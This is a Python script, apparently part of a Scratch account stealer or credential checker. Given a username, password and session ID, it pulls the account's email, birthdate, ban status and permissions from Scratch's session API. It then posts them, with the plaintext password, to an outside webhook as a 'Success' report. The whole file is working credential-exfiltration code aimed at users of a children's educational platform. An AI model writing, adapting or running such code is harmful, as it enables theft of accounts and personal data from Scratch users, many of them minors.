WEBHOOK_URL = "webhook url"

import requests

headers = {
    'accept': 'application/json',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://scratch.mit.edu',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://scratch.mit.edu/',
    'sec-ch-ua': '"Brave";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
    'x-csrftoken': 'a',
    'x-requested-with': 'XMLHttpRequest',
}

def send_succ(user, password, sid):
    info = requests.get(url=f"https://api.scratch.mit.edu/users/{user}/")
    try:
        _cookies = {
            'permissions': '%7B%7D',
            'scratchcsrftoken': 'a',
            'scratchsessionsid': f'"{sid}"'
        }
        session = requests.get('https://scratch.mit.edu/session/', cookies=_cookies, headers=headers)
        if session.json()["user"]["banned"]:
            banned = "`✅`"
        else:
            banned = "`❌`"
        if session.json()["permissions"]["scratcher"]:
            scratcher = "`✅`"
        else:
            scratcher = "`❌`"
        if session.json()["permissions"]["educator"]:
            educator = "`✅`"
        else:
            educator = "`❌`"
        if session.json()["permissions"]["student"]:
            student = "`✅`"
        else:
            student = "`❌`"
        if session.json()["permissions"]["admin"]:
            admin = "\nAdmin: `✅ wtf!!!`"
        else:
            admin = ""
        birthdate = f'`{session.json()["user"]["birthYear"]}/{session.json()["user"]["birthMonth"]}`'
        email = session.json()["user"]["email"]
    except:
        banned = "`❌`"
        scratcher = "`❌`"
        educator = "`❌`"
        student = "`❌`"
        admin = ""
        birthdate = "`0000/00`"
        email = "example@example.com"
    if info.status_code == 200:
        data = {
            "embeds": [
                {
                    "color": 3407616,
                    "fields": [
                        {
                            "name": "Main info",
                            "value": f"Username: `{user}`\nPassword: `{password}`\nEmail: `{email}`\nBanned: {banned}",
                            "inline": True
                        },
                        {
                            "name": "Other info",
                            "value": f"ID: `{info.json()['id']}`\nCountry: `{info.json()['profile']['country'] or '❌'}`\nJoined: `{info.json()['history']['joined']}`\nBirthdate: {birthdate}",
                            "inline": True
                        },
                        {
                            "name": "Permissions",
                            "value": f"Scratcher: {scratcher}\nTeacher: {educator}\nStudent: {student}{admin}"
                        }
                    ],
                    "thumbnail": {
                        "url": info.json()["profile"]["images"]["60x60"]
                    }
                }
            ],
        }
    else:
        data = {
            "embeds": [
                {
                "title": "Success",
                "description": f"Username: `{user}`\nPassword: `{password}`",
                "color": 3407616
                }
            ],
        }


    response = requests.post(url=WEBHOOK_URL, json=data)
